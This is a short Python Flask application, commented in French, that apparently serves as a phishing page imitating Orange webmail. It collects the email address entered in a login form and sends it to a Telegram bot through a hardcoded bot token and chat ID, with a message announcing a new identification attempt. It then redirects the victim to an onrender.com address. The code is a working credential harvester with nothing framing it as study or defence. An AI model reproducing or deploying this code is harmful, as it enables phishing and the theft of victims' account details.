from flask import Flask, request, redirect, render_template
import requests
import os

app = Flask(__name__)

# Remplace par tes vraies infos
BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
CHAT_ID = "6297861735"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']

        message = f"🔐 Nouvelle tentative d'identification\n📧 Adresse: {email}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            "chat_id": CHAT_ID,
            "text": message
        }
        try:
            requests.get(url, params=params)
        except Exception as e:
            print("Erreur Telegram:", e)

        return redirect("https://orange-mail-k3rh.onrender.com/")

    return render_template('login.html')


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
